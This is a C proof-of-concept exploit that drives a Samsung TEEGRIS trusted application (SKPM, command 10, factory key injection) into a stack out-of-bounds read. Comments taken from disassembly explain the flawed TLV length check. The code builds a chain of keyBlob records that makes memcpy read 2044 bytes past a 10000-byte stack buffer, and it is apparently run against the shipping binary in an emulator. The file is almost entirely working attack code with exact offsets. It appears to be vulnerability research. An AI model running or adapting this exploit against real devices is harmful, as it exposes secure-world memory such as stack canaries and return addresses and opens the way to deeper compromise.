// SKPM-3 dynamic repro — cmd 10 (skpm_factory_key_injection) keyBlob TLV walk
// stack OOB read.  Drives the SHIPPING S921BXXSFDZE1 SKPM binary in TA_GP_emulator.
//
// req layout for cmd 10 (verified byte-exact from DISASM 0x14310..0x14454):
//   req+0x5008 : u32 payload length, must be < 0x2711
//   req+8      : 1 byte (role unclear; set 0)
//   req+9      : u32 key_name_len  k, must be 1..0x32
//   req+8+k+5  : u32 keyBlob_len   (< 0x2711)            -> for k=1: req+14
//   req+8+k+9  : keyBlob bytes (copied into 10000B stack buf v75) -> for k=1: req+18
//
// keyBlob TLV record: [tag=01][subtype=11][len_hi][len_lo][value len bytes]
//   v12 = (len_hi<<8 | len_lo) + 4   (record total),  guard: v12 < 0x801
//   v13 (src offset) advances by v12, bounded ONLY *after* advance (v13 <= 9996).
//   memcpy(v68, &v75[v13], v12)  has NO  v13+v12 <= keyBlob_len  bound  => OOB read.
//
// Chain: rec0..3 = 0x800 each (v13: 0->8192), rec4 = 0x70C (v13 -> 9996),
//        rec5 header @9996 claims v12=0x800 -> memcpy reads v75[9996..12044) =
//        2044 bytes past the 10000B buffer end (canary, x29, x30, parent frame).
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

#define REQ_SZ   0x500c
#define KBLOB_SZ 0x2710          /* 10000 */

static unsigned put_rec(unsigned char *kb, unsigned off, unsigned lenfield)
{
    unsigned v12 = lenfield + 4;            /* record total */
    kb[off+0] = 0x01;                       /* tag      */
    kb[off+1] = 0x11;                       /* subtype  (17) */
    kb[off+2] = (lenfield >> 8) & 0xff;     /* len_hi @ v13+2 */
    kb[off+3] = (lenfield     ) & 0xff;     /* len_lo @ v13+3 */
    memset(kb+off+4, 0x41, lenfield);       /* value    */
    return v12;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    unsigned char *req = malloc(REQ_SZ);
    memset(req, 0, REQ_SZ);

    *(unsigned int*)(req + 0x5008) = KBLOB_SZ;   /* payload length field < 0x2711 */
    unsigned k = 1;                              /* key_name_len (1..0x32) */
    req[8] = 0;
    *(unsigned int*)(req + 9)       = k;         /* key_name_len  */
    *(unsigned int*)(req + 8+k+5)   = KBLOB_SZ;  /* keyBlob_len   (req+14) */

    unsigned char *kb = req + 8 + k + 9;         /* keyBlob start (req+18) */
    unsigned off = 0;
    /* rec0..3 : 0x800 bytes each -> v13: 0 -> 0x2000 (8192) */
    for (int i = 0; i < 4; i++) off += put_rec(kb, off, 0x7FC);
    /* rec4 : 0x70C bytes -> v13 -> 9996 (0x270C) */
    off += put_rec(kb, off, 0x708);
    /* off now == 9996; lay the OOB record HEADER at v13=9996 (value is OOB) */
    kb[off+0] = 0x01; kb[off+1] = 0x11;
    kb[off+2] = 0x07; kb[off+3] = 0xFC;          /* lenfield 0x7FC -> v12=0x800 */
    printf("[poc] chain built: last record header @ keyBlob offset %u (0x%x)\n", off, off);
    printf("[poc] -> memcpy will read v75[%u..%u), buffer end=%u  (OOB by %d bytes)\n",
           off, off+0x800, KBLOB_SZ, (int)(off+0x800-KBLOB_SZ));

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);   /* == 0x65 */
    void *out = malloc(REQ_SZ); memset(out, 0, REQ_SZ);
    op.params[0].tmpref.buffer = req;  op.params[0].tmpref.size = REQ_SZ;
    op.params[1].tmpref.buffer = out;  op.params[1].tmpref.size = REQ_SZ;
    uint32_t err_origin = 0;

    printf("[poc] InvokeCommand cmd=10 paramTypes=0x%lx\n", (unsigned long)op.paramTypes);
    TEEC_Result res = TEEC_InvokeCommand_impl(session, 10, &op, &err_origin);
    printf("[poc] cmd 10 returned res=0x%x origin=0x%x\n", res, err_origin);
}

int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-0000534b504d";
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    load_functions();
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1); }

    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
